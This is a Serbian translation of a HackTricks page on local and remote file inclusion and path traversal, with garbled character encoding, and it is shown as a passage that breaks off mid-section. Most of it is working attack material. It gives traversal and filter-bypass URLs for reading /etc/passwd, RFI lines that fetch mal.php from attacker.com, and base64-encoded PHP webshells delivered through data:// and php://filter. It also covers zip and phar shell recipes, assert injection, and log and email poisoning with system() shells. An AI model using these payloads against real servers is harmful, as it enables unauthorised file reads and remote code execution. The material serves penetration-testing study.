# UkljuÄivanje datoteka/PretraÅ¾ivanje putanja

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE PRETPLATE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hakerski uvidi**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Vesti o hakovanju u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Najnovije objave**\
Budite informisani o najnovijim pokretanjima nagrada za pronalaÅ¾enje bagova i vaÅ¾nim aÅ¾uriranjima platforme

**PridruÅ¾ite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

## UkljuÄivanje datoteka

**Udaljeno ukljuÄivanje datoteka (RFI):** Datoteka se uÄitava sa udaljenog servera (Najbolje: MoÅ¾ete napisati kod i server Ä‡e ga izvrÅ¡iti). U php-u je ovo **onemoguÄ‡eno** po podrazumevanim podeÅ¡avanjima (**allow\_url\_include**).\
**Lokalno ukljuÄivanje datoteka (LFI):** Server uÄitava lokalnu datoteku.

Ranjivost se javlja kada korisnik na neki naÄin moÅ¾e kontrolisati datoteku koju Ä‡e server uÄitati.

Ranjive **PHP funkcije**: require, require\_once, include, include\_once

Interesantan alat za iskoriÅ¡Ä‡avanje ove ranjivosti: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Slepo - Interesantno - LFI2RCE datoteke
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**MeÅ¡anjem nekoliko \*nix LFI lista i dodavanjem viÅ¡e putanja, kreirao sam ovu:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

TakoÄ‘e pokuÅ¡ajte da promenite `/` u `\`\
TakoÄ‘e pokuÅ¡ajte da dodate `../../../../../`

Listu koja koristi nekoliko tehnika za pronalaÅ¾enje fajla /etc/password (kako bi se proverilo da li postoji ranjivost) moÅ¾ete pronaÄ‡i [ovde](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Spajanje razliÄitih wordlisti:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

TakoÄ‘e pokuÅ¡ajte da promenite `/` u `\`\
TakoÄ‘e pokuÅ¡ajte da uklonite `C:/` i dodate `../../../../../`

Listu koja koristi nekoliko tehnika za pronalaÅ¾enje fajla /boot.ini (kako bi se proverilo da li postoji ranjivost) moÅ¾ete pronaÄ‡i [ovde](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Proverite LFI listu za linux.

## Osnovni LFI i zaobilaÅ¾enje

Svi primeri su za lokalno ukljuÄivanje fajlova, ali mogu se primeniti i na udaljeno ukljuÄivanje fajlova (stranica=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### sekvence pretrage bez rekurzije sa uklonjenim znakovima

Ova tehnika se koristi za izvrÅ¡avanje napada na ukljuÄivanje datoteka kada ciljani veb server primenjuje filtriranje putanja kako bi spreÄio upotrebu specijalnih znakova. Umesto da koristite rekurzivne sekvence pretrage, ova metoda uklanja sve specijalne znakove iz putanje kako bi se izvrÅ¡io napad.

Da biste primenili ovu tehniku, sledite sledeÄ‡e korake:

1. Identifikujte ciljani veb server koji koristi filtriranje putanja.
2. IzvrÅ¡ite napad na ukljuÄivanje datoteka koristeÄ‡i standardne sekvence pretrage.
3. Ako primetite da se specijalni znakovi u putanji filtriraju, uklonite ih iz sekvence pretrage.
4. Ponovite korake 2 i 3 sve dok ne uspete da izvrÅ¡ite napad na ukljuÄivanje datoteka.

Ova tehnika omoguÄ‡ava izvrÅ¡avanje napada na ukljuÄivanje datoteka Äak i kada ciljani veb server primenjuje filtriranje putanja.
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null bajt (%00)**

Bajpasirajte dodavanje dodatnih znakova na kraju pruÅ¾enog stringa (bajpas za: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Ovo je **reÅ¡eno od PHP 5.4**

### **Kodiranje**

MoÅ¾ete koristiti ne-standardna kodiranja kao Å¡to je dvostruko URL kodiranje (i druga):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Iz postojeÄ‡e fascikle

MoÅ¾da se back-end proverava putanja fascikle:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### IstraÅ¾ivanje direktorijuma fajl sistema na serveru

Fajl sistem servera moÅ¾e se rekurzivno istraÅ¾ivati kako bi se identifikovali direktorijumi, a ne samo fajlovi, primenom odreÄ‘enih tehnika. Ovaj proces ukljuÄuje odreÄ‘ivanje dubine direktorijuma i ispitivanje postojanja odreÄ‘enih foldera. U nastavku je detaljno opisan metod za postizanje ovog cilja:

1. **Odredite dubinu direktorijuma:**
UtvrÄ‘ivanje dubine trenutnog direktorijuma postiÅ¾e se uspeÅ¡nim dohvatanjem fajla `/etc/passwd` (primenjivo ako je server zasnovan na Linuxu). Primer URL-a moÅ¾e biti struktuiran na sledeÄ‡i naÄin, Å¡to ukazuje na dubinu od tri:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **IstraÅ¾ivanje foldera:**
Dodajte ime sumnjivog foldera (npr. `private`) na URL, a zatim se vratite na `/etc/passwd`. Dodavanje dodatnog nivoa direktorijuma zahteva poveÄ‡anje dubine za jedan:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **TumaÄenje rezultata:**
Odgovor servera ukazuje da li folder postoji:
- **GreÅ¡ka / Nema izlaza:** Folder `private` verovatno ne postoji na navedenoj lokaciji.
- **SadrÅ¾aj `/etc/passwd`:** PotvrÄ‘eno je prisustvo foldera `private`.

4. **Rekurzivno istraÅ¾ivanje:**
Otkriveni folderi mogu se dalje istraÅ¾ivati u potrazi za poddirektorijumima ili fajlovima koristeÄ‡i istu tehniku ili tradicionalne metode lokalnog ukljuÄivanja fajlova (LFI).

Za istraÅ¾ivanje direktorijuma na razliÄitim lokacijama u fajl sistemu, prilagodite payload prema potrebi. Na primer, da biste proverili da li `/var/www/` sadrÅ¾i direktorijum `private` (pretpostavljajuÄ‡i da je trenutni direktorijum na dubini 3), koristite:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Tehnika skraÄ‡ivanja putanje**

Tehnika skraÄ‡ivanja putanje je metoda koja se koristi za manipulaciju putanjama datoteka u veb aplikacijama. ÄŒesto se koristi za pristup ograniÄenim datotekama zaobilazeÄ‡i odreÄ‘ene sigurnosne mere koje dodaju dodatne karaktere na kraj putanja datoteka. Cilj je da se kreira putanja datoteke koja, nakon izmena sigurnosne mere, i dalje pokazuje na Å¾eljenu datoteku.

U PHP-u, razliÄiti prikazi putanje datoteke mogu se smatrati ekvivalentnim zbog prirode fajl sistema. Na primer:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` i `/etc/passwd/` se tretiraju kao ista putanja.
- Kada su poslednjih 6 karaktera `passwd`, dodavanje `/` (ÄineÄ‡i ga `passwd/`) ne menja ciljanu datoteku.
- SliÄno tome, ako se `.php` doda na putanju datoteke (kao Å¡to je `shellcode.php`), dodavanje `/.` na kraju neÄ‡e promeniti pristupanoj datoteci.

PruÅ¾eni primeri demonstriraju kako koristiti tehniku skraÄ‡ivanja putanje da bi se pristupilo `/etc/passwd`, Äestoj meti zbog njenog osetljivog sadrÅ¾aja (informacije o korisniÄkim nalozima):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
U ovim scenarijima, broj potrebnih prolaza moÅ¾e biti oko 2027, ali taj broj moÅ¾e varirati na osnovu konfiguracije servera.

- **KoriÅ¡Ä‡enje taÄka segmenata i dodatnih karaktera**:
Sekvence prolaza (`../`) kombinovane sa dodatnim taÄka segmentima i karakterima mogu se koristiti za navigaciju po fajl sistemu, efektivno ignoriÅ¡uÄ‡i dodate stringove od strane servera.

- **OdreÄ‘ivanje potrebnog broja prolaza**:
Kroz pokuÅ¡aj i greÅ¡ku, moÅ¾e se pronaÄ‡i precizan broj sekvenci `../` potrebnih za navigaciju do korenskog direktorijuma, a zatim do `/etc/passwd`, obezbeÄ‘ujuÄ‡i da se neutraliÅ¡u dodati stringovi (kao Å¡to je `.php`), ali da Å¾eljena putanja (`/etc/passwd`) ostane netaknuta.

- **PoÄetak sa laÅ¾nim direktorijumom**:
UobiÄajena praksa je zapoÄeti putanju sa nepostojeÄ‡im direktorijumom (kao Å¡to je `a/`). Ova tehnika se koristi kao preventivna mera ili da bi se ispunili zahtevi logike parsiranja putanje servera.

Prilikom koriÅ¡Ä‡enja tehnika skraÄ‡ivanja putanje, kljuÄno je razumeti ponaÅ¡anje servera pri parsiranju putanje i strukturu fajl sistema. Svaki scenario moÅ¾e zahtevati drugaÄiji pristup, a Äesto je potrebno testiranje da bi se pronaÅ¡la najefektivnija metoda.

**Ova ranjivost je ispravljena u PHP 5.3.**

### **Trikovi za zaobilaÅ¾enje filtera**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Udaljeno ukljuÄivanje fajlova

U PHP-u je ovo podrazumevano onemoguÄ‡eno jer je **`allow_url_include`** postavljen na **Off**. Da bi ovo funkcionisalo, mora biti postavljen na **On**, a u tom sluÄaju moÅ¾ete ukljuÄiti PHP fajl sa vaÅ¡eg servera i dobiti RCE (daljinsko izvrÅ¡avanje koda).
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Ako iz nekog razloga **`allow_url_include`** je **UkljuÄeno**, ali PHP **filtrira** pristup spoljnim veb stranicama, [prema ovom postu](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), moÅ¾ete koristiti na primer protokol podataka sa base64 za dekodiranje b64 PHP koda i dobijanje RCE:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
U prethodnom kodu, konaÄni `+.txt` je dodat jer napadaÄu treba string koji se zavrÅ¡ava sa `.txt`, tako da Ä‡e taj deo stringa biti smeÄ‡e nakon b64 dekodiranja i pravi PHP kod Ä‡e biti ukljuÄen (i stoga, izvrÅ¡en).
{% endhint %}

JoÅ¡ jedan primer **bez koriÅ¡Ä‡enja `php://` protokola** bio bi:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python Root element

U Pythonu, u kodu poput ovog:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Ako korisnik prosledi **apsolutnu putanju** do **`file_name`**, **prethodna putanja se samo uklanja**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
To je Å¾eljeno ponaÅ¡anje prema [dokumentaciji](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Ako je komponenta apsolutna putanja, sve prethodne komponente se odbacuju i spajanje se nastavlja od apsolutne putanje komponente.

## Java Listanje direktorijuma

Izgleda da ako imate Path Traversal u Javi i **zahtevate direktorijum** umesto fajla, **vratiÄ‡e se lista direktorijuma**. Ovo se neÄ‡e deÅ¡avati u drugim jezicima (koliko ja znam).

## Top 25 parametara

Evo liste od 25 najÄeÅ¡Ä‡ih parametara koji mogu biti ranjivi na lokalno ukljuÄivanje fajlova (LFI) (sa [linka](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI koriÅ¡Ä‡enjem PHP omotaÄa i protokola

### php://filter

PHP filteri omoguÄ‡avaju izvoÄ‘enje osnovnih **operacija modifikacije podataka** pre nego Å¡to se proÄitaju ili zapiÅ¡u. Postoje 5 kategorija filtera:

* [Filteri za stringove](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Uklanja oznake iz podataka (sve izmeÄ‘u "<" i ">" znakova)
* Napomena: Ovaj filter je nestao iz modernih verzija PHP-a
* [Filteri za konverziju](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : TransformiÅ¡e u drugo kodiranje (`convert.iconv.<input_enc>.<output_enc>`). Da biste dobili **listu svih podrÅ¾anih kodiranja**, pokrenite u konzoli: `iconv -l`

{% hint style="warning" %}
Zloupotrebom konverzioniog filtera `convert.iconv.*` moÅ¾ete **generisati proizvoljan tekst**, Å¡to moÅ¾e biti korisno za pisanje proizvoljnog teksta ili izvrÅ¡avanje funkcije kao Å¡to je ukljuÄivanje proizvoljnog teksta. Za viÅ¡e informacija pogledajte [**LFI2RCE putem php filtera**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filteri za kompresiju](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Komprimuje sadrÅ¾aj (korisno ako se izvlaÄi puno informacija)
* `zlib.inflate`: Dekomprimuje podatke
* [Filteri za enkripciju](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Zastarelo
* `mdecrypt.*` : Zastarelo
* Ostali filteri
* Pokretanjem `var_dump(stream_get_filters());` u PHP-u moÅ¾ete pronaÄ‡i nekoliko **neoÄekivanih filtera**:
* `consumed`
* `dechunk`: ObrÄ‡e HTTP chunked kodiranje
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,Â£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
Deo "php://filter" je neosetljiv na veliÄinu slova
{% endhint %}

### php://fd

Ovaj omotaÄ omoguÄ‡ava pristup deskriptorima datoteka koje proces ima otvorene. Potencijalno korisno za izvlaÄenje sadrÅ¾aja otvorenih datoteka:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
MoÅ¾ete takoÄ‘e koristiti **php://stdin, php://stdout i php://stderr** da pristupite **file descriptorima 0, 1 i 2** redom (nisam siguran kako bi ovo moglo biti korisno u napadu)

### zip:// i rar://

Otpremite Zip ili Rar fajl sa PHPShell-om unutra i pristupite mu.\
Da biste mogli zloupotrebiti rar protokol, **mora biti posebno aktiviran**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

Data URI je naÄin za ukljuÄivanje podataka direktno u HTML ili CSS fajlove. Ova tehnika se moÅ¾e iskoristiti za ukljuÄivanje malicioznog koda ili izvrÅ¡avanje napada na server. Kada se koristi u kontekstu file inclusion napada, data URI se moÅ¾e iskoristiti za ukljuÄivanje udaljenih fajlova ili Äak izvrÅ¡avanje lokalnih fajlova na serveru. Ovo moÅ¾e dovesti do otkrivanja osetljivih informacija ili izvrÅ¡avanja proizvoljnog koda na serveru. 

Da biste izvrÅ¡ili file inclusion napad pomoÄ‡u data URI, potrebno je pronaÄ‡i ranjivu taÄku na ciljnom serveru koja omoguÄ‡ava ukljuÄivanje fajlova. Zatim moÅ¾ete konstruisati URL koji sadrÅ¾i data URI koji pokazuje na fajl koji Å¾elite ukljuÄiti. Kada se ovaj URL prosledi serveru, on Ä‡e pokuÅ¡ati ukljuÄiti fajl i izvrÅ¡iti ga, Å¡to moÅ¾e dovesti do neÅ¾eljenih posledica.

Da biste se zaÅ¡titili od file inclusion napada putem data URI, preporuÄuje se da se proveri i validira svaki URL koji se prosleÄ‘uje serveru. TakoÄ‘e je vaÅ¾no aÅ¾urirati i zakrpati sve ranjive taÄke na serveru kako bi se smanjio rizik od ovakvih napada.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Napomena da je ovaj protokol ograniÄen php konfiguracijama **`allow_url_open`** i **`allow_url_include`**

### expect://

Expect mora biti aktiviran. MoÅ¾ete izvrÅ¡iti kod koristeÄ‡i ovo:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Navedite svoj payload u POST parametrima:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

`.phar` fajl moÅ¾e se koristiti za izvrÅ¡avanje PHP koda kada veb aplikacija koristi funkcije poput `include` za uÄitavanje fajlova. PHP kod ispod prikazuje kako se kreira `.phar` fajl:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Da biste kompajlirali `.phar` datoteku, treba izvrÅ¡iti sledeÄ‡u komandu:
```bash
php --define phar.readonly=0 create_path.php
```
Prilikom izvrÅ¡avanja, kreiraÄ‡e se datoteka nazvana `test.phar`, koja potencijalno moÅ¾e biti iskoriÅ¡Ä‡ena za iskoriÅ¡Ä‡avanje ranjivosti lokalnog ukljuÄivanja datoteka (LFI).

U sluÄajevima kada LFI samo vrÅ¡i Äitanje datoteka bez izvrÅ¡avanja PHP koda unutar njih, kroz funkcije poput `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` ili `filesize()`, moÅ¾e se pokuÅ¡ati iskoriÅ¡Ä‡avanje ranjivosti de-serijalizacije. Ova ranjivost je povezana sa Äitanjem datoteka koriÅ¡Ä‡enjem `phar` protokola.

Za detaljnije razumevanje iskoriÅ¡Ä‡avanja ranjivosti de-serijalizacije u kontekstu `.phar` datoteka, pogledajte dokument koji je povezan u nastavku:

[Phar vodiÄ za iskoriÅ¡Ä‡avanje de-serijalizacije](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### ViÅ¡e protokola

Proverite viÅ¡e moguÄ‡ih [**protokola koje treba ukljuÄiti ovde**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory i php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) â€” Pisanje u memoriju ili u privremenu datoteku (nije sigurno kako ovo moÅ¾e biti korisno u napadu ukljuÄivanja datoteka)
* [file://](https://www.php.net/manual/en/wrappers.file.php) â€” Pristupanje lokalnom fajl sistemu
* [http://](https://www.php.net/manual/en/wrappers.http.php) â€” Pristupanje HTTP(s) URL-ovima
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) â€” Pristupanje FTP(s) URL-ovima
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) â€” Kompresioni tokovi
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) â€” PronalaÅ¾enje putanja koje odgovaraju Å¡ablonu (ne vraÄ‡a niÅ¡ta Å¡tampajuÄ‡e, pa nije stvarno korisno ovde)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) â€” Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) â€” Audio tokovi (Nije korisno za Äitanje proizvoljnih datoteka)

## LFI putem PHP-ove 'assert' funkcije

Rizici lokalnog ukljuÄivanja datoteka (LFI) u PHP-u su posebno visoki prilikom rukovanja funkcijom 'assert', koja moÅ¾e izvrÅ¡iti kod unutar stringova. To je posebno problematiÄno ako se proverava ulaz koji sadrÅ¾i karaktere za pretraÅ¾ivanje direktorijuma poput "..", ali nije pravilno dezinfikovan.

Na primer, PHP kod moÅ¾e biti dizajniran da spreÄi pretraÅ¾ivanje direktorijuma na sledeÄ‡i naÄin:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Iako ovo ima za cilj zaustavljanje traversal-a, nenamerno stvara vektor za ubrizgavanje koda. Da bi iskoristio ovo za Äitanje sadrÅ¾aja fajla, napadaÄ bi mogao koristiti:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
SliÄno tome, za izvrÅ¡avanje proizvoljnih sistemskih komandi, moÅ¾e se koristiti:
```plaintext
' and die(system("id")) or '
```
VaÅ¾no je **URL-kodirati ove payloade**.


<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hakerski uvidi**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Hakerske vesti u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja putem vesti i uvida u realnom vremenu

**Najnovije objave**\
Budite informisani o najnovijim pokretanjima nagrada za pronalaÅ¾enje bagova i vaÅ¾nim aÅ¾uriranjima platforme

**PridruÅ¾ite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

## PHP slepo putovanje putem putanje

{% hint style="warning" %}
Ova tehnika je relevantna u sluÄajevima kada **kontroliÅ¡ete** **putanju fajla** **PHP funkcije** koja Ä‡e **pristupiti fajlu**, ali neÄ‡ete videti sadrÅ¾aj fajla (kao jednostavan poziv **`file()`**), ali sadrÅ¾aj nije prikazan.
{% endhint %}

U [**ovom neverovatnom postu**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) objaÅ¡njeno je kako se slepo putovanje putem putanje moÅ¾e zloupotrebiti putem PHP filtera da bi se **izfiltrirao sadrÅ¾aj fajla putem orakla greÅ¡ke**.

Ukratko, tehnika koristi **"UCS-4LE" kodiranje** da bi sadrÅ¾aj fajla bio toliko **veliki** da Ä‡e **PHP funkcija koja otvara** fajl izazvati **greÅ¡ku**.

Zatim, kako bi se otkrio prvi karakter, koristi se filter **`dechunk`** zajedno sa drugim filterima kao Å¡to su **base64** ili **rot13**, a zatim se koriste filteri **convert.iconv.UCS-4.UCS-4LE** i **convert.iconv.UTF16.UTF-16BE** da bi se **postavili drugi karakteri na poÄetak i otkrili ih**.

**Funkcije koje mogu biti ranjive**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (samo cilj Äitanja samo sa ovim)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Za tehniÄke detalje pogledajte pomenuti post!

## LFI2RCE

### Udaljeno ukljuÄivanje fajla

ObjaÅ¡njeno ranije, [**pratite ovaj link**](./#remote-file-inclusion).

### Putem log fajla Apache/Nginx

Ako je server Apache ili Nginx **ranjiv na LFI** unutar funkcije za ukljuÄivanje, moÅ¾ete pokuÅ¡ati pristupiti **`/var/log/apache2/access.log` ili `/var/log/nginx/access.log`**, postaviti unutar **user agenta** ili unutar **GET parametra** PHP shell kao Å¡to je **`<?php system($_GET['c']); ?>`** i ukljuÄiti taj fajl

{% hint style="warning" %}
Imajte na umu da **ako koristite dvostruke navodnike** za shell umesto **jednostrukih navodnika**, dvostruki navodnici Ä‡e biti izmenjeni u string "_**quote;**_", **PHP Ä‡e tu baciti greÅ¡ku** i **niÅ¡ta drugo neÄ‡e biti izvrÅ¡eno**.

TakoÄ‘e, pobrinite se da **ispravno napiÅ¡ete payload** ili Ä‡e PHP svaki put pri pokuÅ¡aju uÄitavanja log fajla baciti greÅ¡ku i neÄ‡ete imati drugu priliku.
{% endhint %}

Ovo se takoÄ‘e moÅ¾e uraditi i u drugim logovima, ali **budite oprezni**, kod unutar logova moÅ¾e biti URL-kodiran i to moÅ¾e uniÅ¡titi Shell. Zaglavlje **autorizacija "basic"** sadrÅ¾i "korisnik:lozinka" u Base64 i dekodira se unutar logova. PHPShell moÅ¾e biti ubaÄen unutar ovog zaglavlja.\
Drugi moguÄ‡i putovi logova:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Putem e-poÅ¡te

**PoÅ¡aljite e-poÅ¡tu** na interni nalog (user@localhost) koja sadrÅ¾i vaÅ¡ PHP payload kao `<?php echo system($_REQUEST["cmd"]); ?>` i pokuÅ¡ajte da je ukljuÄite u poÅ¡tu korisnika sa putanjom kao **`/var/mail/<KORISNIÄŒKO_IME>`** ili **`/var/spool/mail/<KORISNIÄŒKO_IME>`**

### Putem /proc/\*/fd/\*

1. UÄitajte puno shell-ova (na primer: 100)
2. UkljuÄite [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), gde je $PID PID procesa (moÅ¾e se probiti) i $FD deskriptor fajla (takoÄ‘e se moÅ¾e probiti)

### Putem /proc/self/environ

